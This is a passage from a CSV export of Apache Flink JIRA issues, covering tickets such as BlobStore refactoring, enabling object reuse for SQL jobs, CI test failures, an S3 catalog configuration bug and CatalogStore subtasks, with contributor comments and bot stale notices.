To prevent this problem, the MongoWriter should regularly check whether the last write time is greater than the specified time.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,https://lists.apache.org/thread/15mmltprxdb7hyjv0syok6fzcbfk9coj,,,,,,,,,,9223372036854775807,,,,Wed Jun 28 04:07:19 UTC 2023,,,,,,,,,,"0|z1it4g:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"27/Jun/23 12:10;jiabao.sun;[~Leonard] Can you help assign this ticket to me?;;;","27/Jun/23 13:24;leonard;Thanks  [~jiabao.sun] for reporting this issue, assigned to you.;;;","28/Jun/23 04:07;leonard;Fixed in flink-connector-mongodb(main): 49b7550fbc0285e1c605c5b0efdae762cd9b144b;;;",,,,,,,,,,,,,,,,,,,,
BlobStore.closeAndCleanupAllData doesn't do any close action,FLINK-32445,13541520,,Technical Debt,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,Fixed,jiabao.sun,mapohl,mapohl,27/Jun/23 08:02,05/Oct/23 04:17,04/Jun/24 20:41,05/Oct/23 04:17,1.18.0,,,,,,,,,,,,,,1.19.0,,,,,,Runtime / Coordination,,,,0,auto-deprioritized-major,pull-request-available,starter,"We might want to refactor {{BlobStore.closeAndCleanupAllData}}: It doesn't close any resources (and doesn't need to). Therefore, renaming the interfaces method to {{cleanAllData}} seems to be more appropriate.

This enables us to remove redundant code in {{AbstractHaServices.closeAndCleanupAllData}} and {{AbstractHaServices.close}}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Oct 05 04:17:14 UTC 2023,,,,,,,,,,"0|z1isvs:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"26/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Major but is unassigned and neither itself nor its Sub-Tasks have been updated for 60 days. I have gone ahead and added a ""stale-major"" to the issue"". If this ticket is a Major, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","03/Sep/23 22:35;flink-jira-bot;This issue was labeled ""stale-major"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Major, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;","15/Sep/23 09:18;jiabao.sun;Hi [~mapohl], I just submit a PR of this issue.
If you have time, could you please help review it?;;;","05/Oct/23 04:17;mapohl;master: cd95b560d0c11a64b42bf6b98107314d32a4de86;;;",,,,,,,,,,,,,,,,,,,
Enable object reuse for Flink SQL jobs by default,FLINK-32444,13541504,,New Feature,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,jark,jark,27/Jun/23 06:31,11/Mar/24 12:44,04/Jun/24 20:41,,,,,,,,,,,,,,,,1.20.0,,,,,,Table SQL / API,,,,0,,,,"Currently, object reuse is not enabled by default for Flink Streaming Jobs, but is enabled by default for Flink Batch jobs. That is not consistent for stream-batch unification. Besides, SQL operators are safe to enable object reuse and this is a great performance improvement for SQL jobs. 

We should also be careful with the Table-DataStream conversion case (StreamTableEnvironment) which is not safe to enable object reuse by default. Maybe we can just enable it for SQL Client/Gateway and TableEnvironment. ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Nov 30 09:49:02 UTC 2023,,,,,,,,,,"0|z1iss8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"27/Jun/23 06:32;jark;cc [~lincoln.86xy], [~lsy], [~twalthr] what do you think?;;;","27/Jun/23 14:36;lincoln.86xy;[~jark] Cool! this would be benifitial for sql users;;;","27/Jun/23 15:55;libenchao;Big +1 on this, we've enabled it for all production jobs, and get a very good performance improvement.;;;","12/Jul/23 14:47;twalthr;Does it give us a performance benefits? If I remember correctly, I checked the code base and the DataStream API does not really use this property for any kind of optimizations. And it might cause issues with HeapStateBackend? In any case, if we don't break anything and gain performance, +1 to this.;;;","03/Nov/23 16:24;twalthr;[~jark] is there a reason why you didn't implement this issue yet? Are there known issues? I guess this would be very low hanging fruit for performance if it causes no issues.;;;","03/Nov/23 16:31;pnowojski;{quote}
Does it give us a performance benefits? 
{quote}
Yes. One one job that I've looked into recently, a subtask reading from Kafka, filtering/projecting records and doing local windowed aggregation, with object reused disabled, is spending something between 25%-50% time inside {{CopyingChainingOutput}}.

If there are no correctness issues with built-in operators/functions in Flink SQL I would be also giving big +1 for enabling reuse by default.;;;","08/Nov/23 08:21;twalthr;I was about to simply open a PR for this change, but then I found this comment here:
https://github.com/apache/flink/blob/master/flink-table/flink-table-planner/src/test/scala/org/apache/flink/table/planner/runtime/utils/StreamingWithStateTestBase.scala#L52
{code}
  enableObjectReuse = state match {
    case HEAP_BACKEND => false // TODO heap statebackend not support obj reuse now.
    case ROCKSDB_BACKEND => true
  }
{code}

This also matches with my memory why we didn't enable it by default. Does anyone know whether something has changed in the meantime?;;;","08/Nov/23 08:25;twalthr;The easiest solution could be to check for the configured state backend? If heap still causes issues?;;;","23/Nov/23 09:14;pnowojski;Instead of checking for the configured state backend, I would add some getter to the statebackend interface like:
{code:java}
boolean StateBackend#storesObjectReferences(); // false for RocksDB, true for HashMap
{code}.;;;","30/Nov/23 09:49;srichter;[~pnowojski] if there really is an issue with heap backend, then we also need to be careful about what type of caching we can build for RocksDB in the future.;;;",,,,,,,,,,,,,
"Translate ""State Processor API"" page into Chinese",FLINK-32443,13541498,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Resolved,Yanfei Lei,Yanfei Lei,Yanfei Lei,27/Jun/23 04:30,14/May/24 04:50,04/Jun/24 20:41,14/May/24 04:50,1.18.0,,,,,,,,,,,,,,,,,,,,API / State Processor,chinese-translation,Documentation,,0,pull-request-available,,,"The page URL is [https://nightlies.apache.org/flink/flink-docs-release-1.17/zh/docs/libs/state_processor_api/]

The markdown file is located in docs/content.zh/docs/libs/state_processor_api.md",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue May 14 04:50:08 UTC 2024,,,,,,,,,,"0|z1isr4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/Jul/23 23:56;pingcai678;Hi,Can you assign this Issue to me as a newcomer？;;;","14/May/24 04:50;Yanfei Lei;Merged into master via 26817092;;;",,,,,,,,,,,,,,,,,,,,,
DownloadPipelineArtifact fails on AZP,FLINK-32442,13541483,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,Sergey Nuyanzin,Sergey Nuyanzin,26/Jun/23 22:49,03/Sep/23 22:35,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,,,,,,,Test Infrastructure,,,,0,auto-deprioritized-major,test-stability,,"DownloadPipelineArtifact fails on AZP
{noformat}
Starting: DownloadPipelineArtifact
==============================================================================
Task         : Download Pipeline Artifacts
Description  : Download build and pipeline artifacts
Version      : 2.198.0
Author       : Microsoft Corporation
Help         : https://docs.microsoft.com/azure/devops/pipelines/tasks/utility/download-pipeline-artifact
==============================================================================
Download from the specified build: #50309
Download artifact to: /home/agent02/_work/2/flink_artifact
##[error]Cannot assign requested address
Finishing: DownloadPipelineArtifact

{noformat}

https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50309&view=logs&j=aa18c3f6-13b8-5f58-86bb-c1cffb239496&t=34dbf679-0f1d-54d2-de92-a83b268b346a&l=11",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sun Sep 03 22:35:11 UTC 2023,,,,,,,,,,"0|z1isns:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"26/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Major but is unassigned and neither itself nor its Sub-Tasks have been updated for 60 days. I have gone ahead and added a ""stale-major"" to the issue"". If this ticket is a Major, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","03/Sep/23 22:35;flink-jira-bot;This issue was labeled ""stale-major"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Major, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;",,,,,,,,,,,,,,,,,,,,,
DefaultSchedulerTest#testTriggerCheckpointAndCompletedAfterStore fails with timeout on AZP,FLINK-32441,13541480,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Fixed,srichter,Sergey Nuyanzin,Sergey Nuyanzin,26/Jun/23 22:21,27/Jun/23 13:08,04/Jun/24 20:41,27/Jun/23 12:50,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,API / Core,Tests,,,0,pull-request-available,test-stability,,"This build https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50461&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8&l=9274

fails with timeout on {{DefaultSchedulerTest#testTriggerCheckpointAndCompletedAfterStore}}

",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 27 12:50:26 UTC 2023,,,,,,,,,,"0|z1isn4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"27/Jun/23 06:30;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50467&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8&l=8576;;;","27/Jun/23 07:49;Sergey Nuyanzin;[~srichter] it looks it starts appearing after merging of FLINK-32347
could you please have a look?;;;","27/Jun/23 11:41;martijnvisser;Other occurrences: 
https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50480&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8&l=9212

https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=50489&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8&l=9195

Depending if this will occur more, we'll have to bump this one to a blocker;;;","27/Jun/23 12:50;srichter;Fixed in master 0c787f5.;;;",,,,,,,,,,,,,,,,,,,
Introduce file merging configuration,FLINK-32440,13541401,13536037,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Resolved,Yanfei Lei,Yanfei Lei,Yanfei Lei,26/Jun/23 12:49,15/Apr/24 06:23,04/Jun/24 20:41,15/Apr/24 06:23,1.18.0,,,,,,,,,,,,,,,,,,,,Runtime / Checkpointing,Runtime / State Backends,,,0,pull-request-available,stale-assigned,,Introduce file merging configuration and config FileMergingSnapshotManager.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Apr 15 06:22:58 UTC 2024,,,,,,,,,,"0|z1is5k:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;","15/Apr/24 06:22;Yanfei Lei;Merged c601c70 into master.;;;",,,,,,,,,,,,,,,,,,,,,
"Kubernetes operator is silently overwriting the ""execution.savepoint.path"" config",FLINK-32439,13541395,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,,rmetzger,rmetzger,26/Jun/23 11:38,26/Jun/23 12:35,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Kubernetes Operator,,,,0,,,,"I recently stumbled across the fact that the K8s operator is silently deleting / overwriting the execution.savepoint.path config option.

I understand why this happens, but I wonder if the operator should write a log message if the user configured the execution.savepoint.path option.

And / or add a list to the docs about ""Operator managed"" config options?

https://github.com/apache/flink-kubernetes-operator/blob/main/flink-kubernetes-operator/src/main/java/org/apache/flink/kubernetes/operator/reconciler/deployment/ApplicationReconciler.java#L155-L159",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 26 12:35:35 UTC 2023,,,,,,,,,,"0|z1is48:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"26/Jun/23 12:35;gyfora;The main downside I see to logging is that these would be logged to a not really user-facing place. But I would assume this can still be useful in the rare cases the user sets this config by error.;;;",,,,,,,,,,,,,,,,,,,,,,
Merge AbstractZooKeeperHaServices and ZooKeeperMultipleComponentLeaderElectionHaServices,FLINK-32438,13541392,13542119,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,mapohl,mapohl,mapohl,26/Jun/23 11:01,03/Jul/23 17:59,04/Jun/24 20:41,03/Jul/23 17:59,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,pull-request-available,,,{{AbstractZooKeeperHaServices}} isn't needed anymore with the legacy ZK leader election being gone.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jul 03 17:59:15 UTC 2023,,,,,,,,,,"0|z1is3k:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"03/Jul/23 17:59;mapohl;master: a7bd6de71dea56307ca9240fee0c6000d11993e5;;;",,,,,,,,,,,,,,,,,,,,,,
Determine and set correct maxParallelism for operator chains,FLINK-32437,13541364,,Bug,In Progress,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,srichter,srichter,srichter,26/Jun/23 08:15,10/Aug/23 22:35,04/Jun/24 20:41,,,,,,,,,,,,,,,,2.0.0,,,,,,API / DataStream,,,,0,pull-request-available,stale-assigned,,Current code in {{StreamingJobGraphGenerator}} does not properly determine and set the correct maxParallelism of operator chains. We should set the maxParallelism of the chain as the minimum of all the maxParallelism values among operators in the chain.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Aug 10 22:35:07 UTC 2023,,,,,,,,,,"0|z1irxc:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"03/Jul/23 16:55;pnowojski;Shouldn't we also set different number of keyGroups per each operator in the chain?;;;","10/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;",,,,,,,,,,,,,,,,,,,,,
Remove obsolete LeaderContender.getDescription method,FLINK-32436,13541360,13542119,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,mapohl,mapohl,mapohl,26/Jun/23 07:50,03/Jul/23 17:56,04/Jun/24 20:41,03/Jul/23 17:56,,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,pull-request-available,,,{{LeaderContender.getDescription}} was barely used (only for the log output in the ZK driver implementation). With the {{contenderID}} becoming a more fundamental property of the {{DefaultLeaderElectionService}} we can get rid of the {{getDescription}} method.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jul 03 17:56:06 UTC 2023,,,,,,,,,,"0|z1irwg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"03/Jul/23 17:56;mapohl;master: 310d85950b80f7f775617983df2d82b9c6224201;;;",,,,,,,,,,,,,,,,,,,,,,
Merge testing implementations of LeaderContender,FLINK-32435,13541359,13542119,Sub-task,In Progress,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,mapohl,mapohl,mapohl,26/Jun/23 07:47,10/Aug/23 22:35,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Runtime / Coordination,Tests,,,0,pull-request-available,stale-assigned,,We have several testing implementations of the {{LeaderContender}} interface. We could merge all of them into a single {{TestingLeaderContender}} implementation.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Aug 10 22:35:07 UTC 2023,,,,,,,,,,"0|z1irw8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"10/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issue is assigned but has not received an update in 30 days, so it has been labeled ""stale-assigned"".
If you are still working on the issue, please remove the label and add a comment updating the community on your progress.  If this issue is waiting on feedback, please consider this a reminder to the committer/reviewer. Flink is a very active project, and so we appreciate your patience.
If you are no longer working on the issue, please unassign yourself so someone else may work on it.
;;;",,,,,,,,,,,,,,,,,,,,,,
missing s3 config by catalog,FLINK-32434,13541338,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Invalid,,gary0416,gary0416,26/Jun/23 01:59,26/Jun/23 02:05,04/Jun/24 20:41,26/Jun/23 02:05,1.17.0,,,,,,,,,,,,,,,,,,,,FileSystems,,,,0,catalog,file-system,,"After FLINK-30704, s3 config (s3 prefix) by catalog doesn't work. It works fine in Flink 1.16.

example: [https://paimon.apache.org/docs/master/filesystems/s3/]

 
{code:java}
CREATE CATALOG my_catalog WITH (
    'type' = 'paimon',
    'warehouse' = 's3://path/to/warehouse',
    's3.endpoint' = 'your-endpoint-hostname',
    's3.access-key' = 'correct-user',
    's3.secret-key' = 'yyy'
); {code}
exception: 
{code:java}
Caused by: org.apache.flink.table.api.ValidationException: Unable to create catalog 'xxx'
Catalog options are:
's3.access-key'='correct-user'
's3.endpoint'= http://x.x.x.x:xx/'
's3.secret-key'='*******
'type'='paimon'
'warehouse'='s3://xxx/'
at org.apache.flink.table.factories.Factoryutil.createcataalog(FactoryUtil.java:439)
at org.apache.flink.table.api.internal.TableEnvironmentImpl.creat::Catalog(TableEnvironmentimpl.java:1466)
at org.apache.flink.table.api.internal.TableEnvironmentImpl.executeInter:nal(TableEnvironmentImpl.java:1212)
at org.apache.flink.table.gateway.service.operation.OperationExecutor.callOperation(OperationExecutor.java:541)
at org.apache.flink.table.gateway.service.operation.OperationExecutor.executeOperation(OperationExecutor.java:440)
at org.apache.flink.table.gateway.service.operation.OperationExecutor.executeStatement(OperationExecutor.java:195)
at org.apache.flink.table.gateway.service.SqlGatewayServiceImpl.lambda$executeStatement$1(SqlGatewayServiceImpl.java:212)
at org.apache.flink.table.gateway.service.operation.OperationManager.lambda$submitoperation$1(OperationManager.java:119)
at org.apache.flink.table.gateway.service.operation.OperattionManager$Operation.lambda$run$0(OperationManager.java:258)
... 7 more
Caused by: java.lang.RuntimeException: java.nio.file.AccessDeniedException: s3://xxx/default.db: getFileStatus on s3://xxx/default.db: com.amazonaws.services.s3.model.AmazonS3Exception: Forbidden (Service: Amazon S3; Status Code: 403; Error Code: 403 Forbidden; Req
uest ID: 176A9F853B408F0E; S3 Extended Request ID: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855; Proxy: nul1), S3 Extended Request ID: e3b8c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855:403 Forbidden
at org.apache.paimon.catalog.FileSystemCatalog.uncheck(FilLeSystemCatalog. java:207)
at ofg.apache:paimon.catatog.FitesystemCatalog.createpatabase(FitesystemCa
at org.apache.paimon.flink.FlinkCatalog.<init>(FlinkCatalog.java:112)
at org.apache.paimon.flink.FlinkCatalogFactory.createCatalog(FlinkCatalogFactory.java:70)
at org.apache.paimon.flink.FlinkCatalogFactory.createCatalog(FlinkCatalogFactory. java:58)
at org.apache.paimon.flink.FlinkCatalogFactory.createCatalog(FlinkCatalogFactory. java:32)
at org.apache.flink.table.factories.Factoryutil.createcataalog(FactoryUtil. java:436)
... 15 more {code}
Flink access s3 by user defined in flink-conf.yaml, not 'correct-user' in catalog, causes Forbidden.

 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 26 02:05:24 UTC 2023,,,,,,,,,,"0|z1irrk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"26/Jun/23 02:05;jark;This is an exception thrown by Paimon Catalog, please report this issue to paimon community.;;;",,,,,,,,,,,,,,,,,,,,,,
Add built-in FileCatalogStore ,FLINK-32433,13541322,13541314,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,hackergin,hackergin,hackergin,25/Jun/23 16:46,24/Jul/23 12:09,04/Jun/24 20:41,23/Jul/23 18:18,,,,,,,,,,,,,,,1.18.0,,,,,,,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jul 24 12:06:26 UTC 2023,,,,,,,,,,"0|z1iro0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"23/Jul/23 18:18;leonard;Implemented in master: f8812dc3bc8dffce529e9a0d73a78f82e1123821;;;","24/Jul/23 11:39;ferenc-csaky;Hi [~hackergin], [~leonard],

I see that this is already merged, although we agreed with [~hackergin] I will implement this part. I opened a PR with my changes anyways, because I implemented it to also support external filesystems.

I think a local FS only support is inferior in a production environment compared to a distributed FS, e.g. HDFS or some cloud storage like S3. In my opinion it would worth to support that with the built-in {{FileCatalogStore}}. WDYT?;;;","24/Jul/23 11:56;hackergin;[~ferenc-csaky] Thanks for working on this, I think we can open new jira for supporting  external filesystem. ;;;","24/Jul/23 12:06;ferenc-csaky;Sounds good to me.;;;",,,,,,,,,,,,,,,,,,,
Support Sharing CatalogStoreFactory resources in Flink SQL gateway,FLINK-32432,13541321,13541314,Sub-task,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,,hackergin,hackergin,hackergin,25/Jun/23 16:44,23/Jul/23 18:18,04/Jun/24 20:41,,,,,,,,,,,,,,,,,,,,,,Table SQL / Gateway,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-25 16:44:56.0,,,,,,,,,,"0|z1irns:",9223372036854775807,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support configuring CatalogStore in Table API,FLINK-32431,13541319,13541314,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Implemented,hackergin,hackergin,hackergin,25/Jun/23 16:43,23/Jul/23 18:16,04/Jun/24 20:41,23/Jul/23 18:16,,,,,,,,,,,,,,,1.18.0,,,,,,,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,2023-06-25 16:43:05.0,,,,,,,,,,"0|z1irnc:",9223372036854775807,Implemented in master: 65214293470ca2c131a966915b763b8090e7828e,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support configuring CatalogStore through flink conf,FLINK-32430,13541318,13541314,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Implemented,hackergin,hackergin,hackergin,25/Jun/23 16:41,23/Jul/23 18:14,04/Jun/24 20:41,23/Jul/23 18:14,,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / API,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sun Jul 23 18:14:10 UTC 2023,,,,,,,,,,"0|z1irn4:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"23/Jul/23 18:14;leonard;Implemented in master: c8dfb2a1c683933ed5e336c3be166c88e027ed0c;;;",,,,,,,,,,,,,,,,,,,,,,
Introduce CatalogStore in CatalogManager to support lazy initialization of catalogs and persistence of catalog configurations,FLINK-32429,13541316,13541314,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Implemented,hackergin,hackergin,hackergin,25/Jun/23 16:38,23/Jul/23 18:15,04/Jun/24 20:41,23/Jul/23 18:15,,,,,,,,,,,,,,,1.18.0,,,,,,Table SQL / API,,,,0,pull-request-available,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sun Jul 23 18:15:09 UTC 2023,,,,,,,,,,"0|z1irmo:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"23/Jul/23 18:15;leonard;Implemented in master: e3154d3e4c802fdc7e3697421c5394f51b84cf7b;;;",,,,,,,,,,,,,,,,,,,,,,
Introduce base interfaces for CatalogStore,FLINK-32428,13541315,13541314,Sub-task,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
